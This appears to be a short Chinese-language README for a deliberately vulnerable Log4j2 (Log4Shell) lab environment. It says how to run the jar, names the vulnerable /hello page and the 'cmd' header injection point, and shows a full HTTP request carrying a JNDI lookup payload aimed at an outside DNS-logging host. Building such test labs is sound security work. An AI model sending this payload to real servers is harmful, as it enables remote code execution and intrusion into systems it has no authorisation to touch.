### log4j2环境使用方法

jar：

java -jar运行

漏洞页面：

http://ip:8080/hello

注入点：

报头中的cmd字段中

```
GET /hello HTTP/1.1
Host: ip:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
cmd:${jndi:ldap://hag4gn.dnslog.c}
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

源码：

运行该文件即可

![image-20211213230151388](https://haochen1204.oss-cn-chengdu.aliyuncs.com/web_picture/img/image-20211213230151388.png)

漏洞页面文件，可自行修改

![image-20211213230217170](https://haochen1204.oss-cn-chengdu.aliyuncs.com/web_picture/img/image-20211213230217170.png)